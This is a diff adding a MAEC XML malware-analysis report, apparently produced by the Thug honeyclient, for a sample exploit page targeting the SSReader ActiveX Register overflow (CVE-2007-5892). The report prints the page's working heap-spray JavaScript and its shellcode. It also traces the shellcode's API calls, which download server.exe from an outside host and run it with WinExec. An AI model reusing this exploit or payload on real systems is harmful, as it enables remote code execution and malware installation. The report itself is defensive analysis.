@@ -1,0 +1,171 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-11 20:57:11.701875" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://127.0.0.1/thug/samples/./exploits/ssreader_0day.html" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
+                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					window.onerror=function(){return true;}
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:9">
+                                <Discovery_Method tool_id="maec:thug:tol:8" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					
+					  var   shellcode = unescape("%u9090"+"%u9090"+
+					"%uefe9%u0000%u5a00%ua164%u0030%u0000%u408b%u8b0c" +
+					"%u1c70%u8bad%u0840%ud88b%u738b%u8b3c%u1e74%u0378" +
+					"%u8bf3%u207e%ufb03%u4e8b%u3314%u56ed%u5157%u3f8b" +
+					"%ufb03%uf28b%u0e6a%uf359%u74a6%u5908%u835f%u04c7" +
+					"%ue245%u59e9%u5e5f%ucd8b%u468b%u0324%ud1c3%u03e1" +
+					"%u33c1%u66c9%u088b%u468b%u031c%uc1c3%u02e1%uc103" +
+					"%u008b%uc303%ufa8b%uf78b%uc683%u8b0e%u6ad0%u5904" +
+					"%u6ae8%u0000%u8300%u0dc6%u5652%u57ff%u5afc%ud88b" +
+					"%u016a%ue859%u0057%u0000%uc683%u5613%u8046%u803e" +
+					"%ufa75%u3680%u5e80%uec83%u8b40%uc7dc%u6303%u646d" +
+					"%u4320%u4343%u6643%u03c7%u632f%u4343%u03c6%u4320" +
+					"%u206a%uff53%uec57%u04c7%u5c03%u2e61%uc765%u0344" +
+					"%u7804%u0065%u3300%u50c0%u5350%u5056%u57ff%u8bfc" +
+					"%u6adc%u5300%u57ff%u68f0%u2451%u0040%uff58%u33d0" +
+					"%uacc0%uc085%uf975%u5251%u5356%ud2ff%u595a%ue2ab" +
+					"%u33ee%uc3c0%u0ce8%uffff%u47ff%u7465%u7250%u636f" +
+					"%u6441%u7264%u7365%u0073%u6547%u5374%u7379%u6574" +
+					"%u446d%u7269%u6365%u6f74%u7972%u0041%u6957%u456e" +
+					"%u6578%u0063%u7845%u7469%u6854%u6572%u6461%u4c00" +
+					"%u616f%u4c64%u6269%u6172%u7972%u0041%u7275%u6d6c" +
+					"%u6e6f%u5500%u4c52%u6f44%u6e77%u6f6c%u6461%u6f54" +
+					"%u6946%u656c%u0041"+
+					"%u7468%u7074%u2f3a%u312f%u3176%u6e2e%u6d61%u2f65%u6573%u7672%u7265%u652e%u6578%u8080");
+					
+					//http://1v1.name/server.exe ??????
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Assembly" id="maec:thug:cde:11">
+                                <Discovery_Method tool_id="maec:thug:tol:10" method="Static Analysis"/>
+                                <Code_Segment>
+					FARPROC WINAPI GetProcAddress (
+					     HMODULE = 0x03c7f490 =&gt; 
+					         none;
+					     LPCSTR = 0x03c7f550 =&gt; 
+					           = "GetSystemDirectoryA";
+					) =  0x7c814eea;
+					FARPROC WINAPI GetProcAddress (
+					     HMODULE = 0x03c7f7c0 =&gt; 
+					         none;
+					     LPCSTR = 0x03c7f880 =&gt; 
+					           = "WinExec";
+					) =  0x7c86136d;
+					FARPROC WINAPI GetProcAddress (
+					     HMODULE = 0x03c7faf0 =&gt; 
+					         none;
+					     LPCSTR = 0x03c7fbb0 =&gt; 
+					           = "ExitThread";
+					) =  0x7c80c058;
+					FARPROC WINAPI GetProcAddress (
+					     HMODULE = 0x03c7fe20 =&gt; 
+					         none;
+					     LPCSTR = 0x03c7fee0 =&gt; 
+					           = "LoadLibraryA";
+					) =  0x7c801d77;
+					HMODULE LoadLibraryA (
+					     LPCTSTR = 0x03c80150 =&gt; 
+					           = "urlmon";
+					) =  0x7df20000;
+					FARPROC WINAPI GetProcAddress (
+					     HMODULE = 0x03c803c0 =&gt; 
+					         none;
+					     LPCSTR = 0x03c80480 =&gt; 
+					           = "URLDownloadToFileA";
+					) =  0x7df7b0bb;
+					UINT GetSystemDirectory (
+					     LPTSTR = 0x03c806b0 =&gt; 
+					           = "c:\WINDOWS\system32";
+					     UINT uSize = 32;
+					) =  0x13;
+					HRESULT URLDownloadToFile (
+					     LPUNKNOWN = 0x03c99110 =&gt; 
+					         none;
+					     LPCTSTR = 0x03c991d0 =&gt; 
+					           = "http://1v1.name/server.exe";
+					     LPCTSTR = 0x03c95c60 =&gt; 
+					           = "c:\WINDOWS\system32\a.exe";
+					     DWORD dwReserved = 0;
+					     LPBINDSTATUSCALLBACK lpfnCB = 0;
+					) =  0x0;
+					UINT WINAPI WinExec (
+					     LPCSTR = 0x03c968f0 =&gt; 
+					           = "cmd /c c:\WINDOWS\system32\a.exe";
+					     UINT uCmdShow = 0;
+					) =  0x20;
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Shellcode</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:13">
+                                <Discovery_Method tool_id="maec:thug:tol:12" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					
+					var bigblock = unescape("%u9090%u9090");
+					var headersize = 20;
+					var slackspace = headersize+shellcode.length;
+					while (bigblock.length&lt;slackspace) bigblock+=bigblock;
+					fillblock = bigblock.substring(0, slackspace);
+					block = bigblock.substring(0, bigblock.length-slackspace);
+					while(block.length+slackspace&lt;0x40000) block = block+block+fillblock;
+					memory = new Array();
+					for (x=0; x&lt;100; x++) memory[x] = block+shellcode;
+					;
+					var buffer = '';
+					while (buffer.length &lt; 1024) buffer+="\x05";
+					var ok="1111";
+					target.Register(ok,buffer);
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://127.0.0.1/thug/samples/./exploits/ssreader_0day.html</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.9</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/ssreader_0day.html (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:14">
+            <Purpose>
+                <Attempted_Vulnerability_Exploit vulnerability_type="Known">
+                    <Known_Exploit cve_id="CVE-2007-5892"/>
+                </Attempted_Vulnerability_Exploit>
+            </Purpose>
+            <Description>
+                <Text>[SSReader Pdg2 ActiveX] Register Method Overflow</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:15" method="Dynamic Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools/>
+</MAEC_Bundle>
